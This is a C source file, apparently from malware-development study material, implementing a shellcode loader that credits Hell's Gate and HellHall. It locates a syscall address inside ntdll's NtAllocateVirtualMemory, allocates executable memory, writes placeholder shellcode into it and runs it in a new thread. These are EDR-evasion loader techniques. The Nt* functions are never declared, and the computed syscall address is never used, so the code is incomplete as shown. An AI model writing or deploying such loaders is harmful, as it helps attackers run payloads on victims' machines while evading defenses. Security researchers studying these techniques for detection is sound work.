// Creds to the creators from Hell's Gate and Hell's Hall
// https://github.com/am0nsec/HellsGate/tree/master
// https://github.com/Maldev-Academy/HellHall

#include <windows.h>  
#include <stdio.h>    



// Declare global variables to hold the syscall instruction addresses
UINT_PTR sysAddrNtAllocateVirtualMemory;



int main() {
    PVOID allocBuffer = NULL;  // Declare a pointer to the buffer to be allocated
    SIZE_T buffSize = 0x1000;  // Declare the size of the buffer (4096 bytes)

    // Get a handle to the ntdll.dll library
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll == NULL) {
        // Handle the error, for example, print an error message and return.
        printf("Error: the specified module could not be found.");
        return 1; // Or any other non-zero value, since typically a zero return indicates success
    }

    // Declare and initialize a pointer to the NtAllocateVirtualMemory function and get the address of the NtAllocateVirtualMemory function in the ntdll.dll module
    UINT_PTR pNtAllocateVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
   


    // The syscall stub (actual system call instruction) is some bytes further into the function. 
   // In this case, it's assumed to be 0x12 (18 in decimal) bytes from the start of the function.
   // So we add 0x12 to the function's address to get the address of the system call instruction.
    sysAddrNtAllocateVirtualMemory = pNtAllocateVirtualMemory + 0x12;
    


    // Use the NtAllocateVirtualMemory function to allocate memory for the shellcode
    NtAllocateVirtualMemory((HANDLE)-1, (PVOID*)&allocBuffer, (ULONG_PTR)0, &buffSize, (ULONG)(MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);

    // Define the shellcode to be injected
    unsigned char shellcode[] = "\xfc\x48\x83...";

    ULONG bytesWritten;
    // Use the NtWriteVirtualMemory function to write the shellcode into the allocated memory
    NtWriteVirtualMemory(GetCurrentProcess(), allocBuffer, shellcode, sizeof(shellcode), &bytesWritten);

    HANDLE hThread;
    // Use the NtCreateThreadEx function to create a new thread that starts executing the shellcode
    NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), (LPTHREAD_START_ROUTINE)allocBuffer, NULL, FALSE, 0, 0, 0, NULL);

    // Use the NtWaitForSingleObject function to wait for the new thread to finish executing
    NtWaitForSingleObject(hThread, FALSE, NULL);

    // Return 0 to indicate successful execution of the program.
    return 0;
}
